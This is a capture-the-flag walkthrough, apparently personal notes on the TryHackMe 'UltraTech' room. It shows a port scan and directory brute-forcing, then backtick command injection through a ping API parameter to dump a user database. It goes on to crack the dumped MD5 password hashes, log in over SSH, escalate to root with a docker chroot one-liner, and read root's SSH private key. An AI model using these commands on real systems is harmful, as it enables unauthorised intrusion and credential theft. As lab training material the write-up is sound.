# try hack me (ulta-tech)



## nmap

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-19 17:14 IST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.10.39.191
Host is up (0.45s latency).
Not shown: 9997 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 260.06 seconds


```
we got port 8081 port for the system.
then we ched the system also we got the another port is /31331

for that we have make the nmap scan we get.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-22 14:51 IST
Nmap scan report for 10.10.113.176
Host is up (0.48s latency).

PORT      STATE SERVICE VERSION
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds


```

we have to check the directories in site. 
```
dirb 10.10.113.176:31331

[17:57:56] 301 -  318B  - /js  ->  http://10.10.39.191:31331/js/
[17:58:02] 403 -  301B  - /.ht_wsr.txt
[17:58:02] 403 -  304B  - /.htaccess.bak1
[17:58:02] 403 -  304B  - /.htaccess.orig
[17:58:02] 403 -  306B  - /.htaccess.sample
[17:58:02] 403 -  304B  - /.htaccess.save
[17:58:02] 403 -  305B  - /.htaccess_extra
[17:58:02] 403 -  304B  - /.htaccess_orig
[17:58:02] 403 -  302B  - /.htaccess_sc
[17:58:02] 403 -  302B  - /.htaccessOLD
[17:58:02] 403 -  302B  - /.htaccessBAK
[17:58:02] 403 -  303B  - /.htaccessOLD2
[17:58:02] 403 -  294B  - /.htm
[17:58:02] 403 -  295B  - /.html
[17:58:02] 403 -  304B  - /.htpasswd_test
[17:58:02] 403 -  300B  - /.htpasswds
[17:58:02] 403 -  301B  - /.httr-oauth
[17:58:06] 403 -  294B  - /.php
[17:59:11] 301 -  319B  - /css  ->  http://10.10.39.191:31331/css/
[17:59:21] 200 -   15KB - /favicon.ico
[17:59:28] 301 -  322B  - /images  ->  http://10.10.39.191:31331/images/
[17:59:28] 200 -    4KB - /images/
[17:59:29] 200 -    6KB - /index.html
[17:59:31] 301 -  326B  - /javascript  ->  http://10.10.39.191:31331/javascript/
[17:59:32] 200 -    1KB - /js/
[18:00:00] 200 -   53B  - /robots.txt
[18:00:02] 403 -  303B  - /server-status
[18:00:02] 403 -  304B  - /server-status/
```
after we brute for the and checks any vurnarabality in the in api.js we have a clue call. 
`10.10.113.176:8081/ping?ip=10.10.113.176`
it ping s the command

after that it command window right. lets check any files are databases in it
http://10.10.113.176:8081/ping?ip=`ls`
we got this `utech.db.sqlite`

in this database we got a hash text.
http://10.10.113.176:8081/ping?ip=`cat%20utech.db.sqlite`

 ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84

r00t-> f357a0c52799563c7c7b76c1e7543a32:n100906

admin-> 0d0ea5111e3c1def594c1684e3b9be84:mrsheafy

hashcat -a 0 -m 0 0d0ea5111e3c1def594c1684e3b9be84 /usr/share/SecLists/rockyou.txt
hashcat -a 0 -m 0 f357a0c52799563c7c7b76c1e7543a32) /usr/share/SecLists/rockyou.txt

we are login via ssh : `ssh r00t@10.10.41.251`

we are entered the shell lets check the root privilage for this.
```
sudo -l
```
we didn't get anything. for that lets check the id of the system`id` command to check the root or other service are working are not.

we are seen the `docker`, for this lets check the privilage escation for docker in this website [gtfobins](https://gtfobins.github.io/gtfobins/docker/#sudo).

we got this command 

`sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.

now we are in docker, then check the operation is running.

`docker ps`

we got chroot, for this get into the chroot usin this command. `docker run -v /:/mnt --rm -it bash chroot /mnt sh`

we are enter the privilage mode. now we have to modify this mode.

lets check the id_rsa 9 digit value in
```
cat /root/.ssh/id_rsa
```
we got :`MIIEogIBA`

https://www.linkedin.com/sharing/share-offsite/?url=www.tryhackme.com/r/room/ultratech1